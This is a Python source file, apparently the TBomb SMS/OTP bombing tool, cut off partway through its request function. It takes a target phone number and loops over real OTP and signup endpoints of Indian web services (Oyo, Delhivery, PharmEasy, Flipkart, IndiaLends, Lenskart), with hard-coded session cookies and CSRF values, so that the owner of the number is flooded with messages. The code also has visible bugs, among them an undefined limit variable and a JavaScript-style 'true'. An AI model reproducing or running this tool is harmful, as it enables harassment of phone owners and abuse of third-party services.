
#!/usr/bin/env python
from datetime import datetime
import os
import hashlib
import sys
import time
import threading
import string
import random
import base64
import urllib.request
import urllib.parse

try:
    import requests
except ImportError:
    print('[!] Error: some dependencies are not installed')
    print('Type \'pip install -r requirements.txt\' to install all required packages')
    exit()

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At https://github.com/TheSpeedX/TBomb
# If You Wanna Take Credits For This Code, Please Look Yourself Again

country_codes = {
    '93': 'AF',
    '355': 'AL',
    '213': 'DZ',
    '376': 'AD',
    '244': 'AO',
    '672': 'AQ',
    '54': 'AR',
    '374': 'AM',
    '297': 'AW',
    '61': 'AU',
    '43': 'AT',
    '994': 'AZ',
    '973': 'BH',
    '880': 'BD',
    '375': 'BY',
    '32': 'BE',
    '501': 'BZ',
    '229': 'BJ',
    '975': 'BT',
    '591': 'BO',
    '387': 'BA',
    '267': 'BW',
    '55': 'BR',
    '246': 'IO',
    '673': 'BN',
    '359': 'BG',
    '226': 'BF',
    '257': 'BI',
    '855': 'KH',
    '237': 'CM',
    '238': 'CV',
    '236': 'CF',
    '235': 'TD',
    '56': 'CL',
    '86': 'CN',
    '57': 'CO',
    '269': 'KM',
    '682': 'CK',
    '506': 'CR',
    '385': 'HR',
    '53': 'CU',
    '599': 'AN',
    '357': 'CY',
    '420': 'CZ',
    '243': 'CD',
    '45': 'DK',
    '253': 'DJ',
    '670': 'TL',
    '593': 'EC',
    '20': 'EG',
    '503': 'SV',
    '240': 'GQ',
    '291': 'ER',
    '372': 'EE',
    '251': 'ET',
    '500': 'FK',
    '298': 'FO',
    '679': 'FJ',
    '358': 'FI',
    '33': 'FR',
    '689': 'PF',
    '241': 'GA',
    '220': 'GM',
    '995': 'GE',
    '49': 'DE',
    '233': 'GH',
    '350': 'GI',
    '30': 'GR',
    '299': 'GL',
    '502': 'GT',
    '224': 'GN',
    '245': 'GW',
    '592': 'GY',
    '509': 'HT',
    '504': 'HN',
    '852': 'HK',
    '36': 'HU',
    '354': 'IS',
    '91': 'IN',
    '62': 'ID',
    '98': 'IR',
    '964': 'IQ',
    '353': 'IE',
    '972': 'IL',
    '39': 'IT',
    '225': 'CI',
    '81': 'JP',
    '962': 'JO',
    '254': 'KE',
    '686': 'KI',
    '383': 'XK',
    '965': 'KW',
    '996': 'KG',
    '856': 'LA',
    '371': 'LV',
    '961': 'LB',
    '266': 'LS',
    '231': 'LR',
    '218': 'LY',
    '423': 'LI',
    '370': 'LT',
    '352': 'LU',
    '853': 'MO',
    '389': 'MK',
    '261': 'MG',
    '265': 'MW',
    '60': 'MY',
    '960': 'MV',
    '223': 'ML',
    '356': 'MT',
    '692': 'MH',
    '222': 'MR',
    '230': 'MU',
    '262': 'RE',
    '52': 'MX',
    '691': 'FM',
    '373': 'MD',
    '377': 'MC',
    '976': 'MN',
    '382': 'ME',
    '212': 'EH',
    '258': 'MZ',
    '95': 'MM',
    '264': 'NA',
    '674': 'NR',
    '977': 'NP',
    '31': 'NL',
    '687': 'NC',
    '64': 'NZ',
    '505': 'NI',
    '227': 'NE',
    '234': 'NG',
    '683': 'NU',
    '850': 'KP',
    '47': 'SJ',
    '968': 'OM',
    '92': 'PK',
    '680': 'PW',
    '970': 'PS',
    '507': 'PA',
    '675': 'PG',
    '595': 'PY',
    '51': 'PE',
    '63': 'PH',
    '48': 'PL',
    '351': 'PT',
    '974': 'QA',
    '242': 'CG',
    '40': 'RO',
    '7': 'RU',
    '250': 'RW',
    '590': 'MF',
    '290': 'SH',
    '508': 'PM',
    '685': 'WS',
    '378': 'SM',
    '239': 'ST',
    '966': 'SA',
    '221': 'SN',
    '381': 'RS',
    '248': 'SC',
    '232': 'SL',
    '65': 'SG',
    '421': 'SK',
    '386': 'SI',
    '677': 'SB',
    '252': 'SO',
    '27': 'ZA',
    '82': 'KR',
    '211': 'SS',
    '34': 'ES',
    '94': 'LK',
    '249': 'SD',
    '597': 'SR',
    '268': 'SZ',
    '46': 'SE',
    '41': 'CH',
    '963': 'SY',
    '886': 'TW',
    '992': 'TJ',
    '255': 'TZ',
    '66': 'TH',
    '228': 'TG',
    '690': 'TK',
    '676': 'TO',
    '216': 'TN',
    '90': 'TR',
    '993': 'TM',
    '688': 'TV',
    '256': 'UG',
    '380': 'UA',
    '971': 'AE',
    '44': 'GB',
    '1': 'US',
    '598': 'UY',
    '998': 'UZ',
    '678': 'VU',
    '379': 'VA',
    '58': 'VE',
    '84': 'VN',
    '681': 'WF',
    '967': 'YE',
    '260': 'ZM',
    '263': 'ZW'
}


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo="""                                                  
   ████████ ██████                 ██             
   ▒▒▒██▒▒▒ ██▒▒▒██                ██             
      ██    ██   ██  ████  ██   ██ ██             
      ██    ██████▒ ██▒▒██ ███ ███ █████          
      ██    ██▒▒▒██ ██  ██ ██▒█▒██ ██▒▒██         
      ██    ██   ██ ██  ██ ██ ▒ ██ ██  ██         
      ██    ██████▒ ▒████▒ ██   ██ █████▒         
      ▒▒    ▒▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒          
                                         """
    print(random.choice(colors)+logo+W)
    print("\n")



count_inf = 0


def infinite(pn, dl, ch, max):
    global count_inf
    while True:
        while os.path.exists('proc.xxx'):
            time.sleep(0.5)
        os.system('touch proc.xxx')
        api = random.choice(ch)
        try:
            ret = getapi(pn, api, 91)
        except Exception:
            ret = False
        if not ret:
            while ch.count(api) > 0:
                ch.remove(api)
            continue
        os.system('rm proc.xxx >/dev/null 2>&1')
        count_inf += 1
        # os.system('echo SpeedX >> count.xxx')
        time.sleep(float(dl))
        if (count_inf > maxlim):
            exit()


def checkinternet():
    res = False
    try:
        # requests.get('https://www.google.com', verify=True)
        requests.get('https://www.google.com')
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
        print('\t\tTBomb Will Stop Now...\n\n')
        banner()
        exit()

def getapi(pn,lim,cc):
    cc=str(cc)
    pn=str(pn)
    lim = int(lim)
    url = ["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +
           str(cc) + "&nod=4&phone=" + pn, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn]
    try:
        if lim < len(url):
            urllib.request.urlopen(str(url[lim]))
            return True
    except (urllib.error.HTTPError, urllib.error.URLError):
        return False
    if lim == 3:
        headers = {
            'Host': 'pharmeasy.in',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://pharmeasy.in/',
            'Content-Type': 'application/json',
            'Content-Length': '30',
            'Connection': 'keep-alive',
        }

        data = {"contactNumber":pn}

        response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
        return response.status_code==200
    elif lim == 4:
        cookies = {
        '_ga': 'GA1.2.1273460610.1561191565',
        '_gid': 'GA1.2.172574299.1561191565',
        '_gcl_au': '1.1.833556660.1561191566',
        '_fbp': 'fb.1.1561191568709.1707722126',
        'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
        }
        headers={
            'Host': 'www.heromotocorp.com',
            'Connection': 'keep-alive',
            'Content-Length': '126',
            'Accept': '*/*',
            'Origin': 'https://www.heromotocorp.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }

        data = {
          'mobile_no': pn,
          'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
          'mobile_no_otp': '',
          'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
        }

        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)

        return response.status_code==200
    elif lim == 5:
        cookies = {
            'Cookie:_ga': 'GA1.2.1483885314.1559157646',
            '_fbp': 'fb.1.1559157647161.1989205138',
            'TiPMix': '91.9909185226964',
            'gcb_t_track': 'SEO - Google',
            'gcb_t_keyword': '',
            'gcb_t_l_url': 'https://www.google.com/',
            'gcb_utm_medium': '',
            'gcb_utm_campaign': '',
            'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs',
            'web_app_landing_utm_source': '',
            'web_app_landing_url': '/personal-loan',
            'webapp_landing_referral_url': 'https://www.google.com/',
            'ARRAffinity': '747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417',
            '_gid': 'GA1.2.969623705.1560660444',
            '_gat': '1',
            'current_url': 'https://indialends.com/personal-loan',
            'cookies_plbt': '0',
        }

        headers = {
            'Host': 'indialends.com',
            'Connection': 'keep-alive',
            'Content-Length': '75',
            'Accept': '*/*',
            'Origin': 'https://indialends.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://indialends.com/personal-loan',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }

        data = {
          'aeyder03teaeare': '1',
          'ertysvfj74sje': cc,
          'jfsdfu14hkgertd': pn,
          'lj80gertdfg': '0'
        }

        response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
        return True
    elif lim == 6:
        headers = {
        'host': 'www.flipkart.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br',
        'referer': 'https://www.flipkart.com/',
        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop',
        'origin': 'https://www.flipkart.com',
        'connection': 'keep-alive',
        'Content-Type': 'application/json; charset=utf-8'}

        data = {"loginId":["+"+cc+pn],"supportAllStates":true}

        response = requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
        return True
    elif lim == 7:
        cookies = {
        'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
        'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
        'lux_uid': '155867904381892986',
        'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
        'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
        's_cc': 'true',
        'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
        'gpv_pn': 'HomePage',
        'gpv_pn_t': 'Homepage',
        'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
        's_sq': '%5B%5BB%5D%5D'}

        headers = {
            'Host': 'www.flipkart.com',
            'Connection': 'keep-alive',
            'Content-Length': '60',
            'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
            'Origin': 'https://www.flipkart.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Referer': 'https://www.flipkart.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }

        data = {
          'loginId': '+'+cc+pn,
          'state': 'VERIFIED',
          'churnEmailRequest': 'false'
        }

        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
        return True
    elif lim == 8:
        headers = {
            'Host': 'www.ref-r.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '26',
            'DNT': '1',
            'Connection': 'keep-alive',
        }

        data = {
          'mobile': pn,
          'submit': '1',
          'undefined': ''
        }

        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
        return True
    elif lim == 9:

        headers = {
            'X-DROID-VERSION': '4.12.5',
            'API-Version': '2.0',
            'user-agent': 'samsung SM-G9350 0 4.4.2',
            'client-version': 'Android-4.12.5',
            'X-DROID-VERSION-CODE': '158',
            'Accept': 'application/json',
            'client-name': 'Practo Android App',
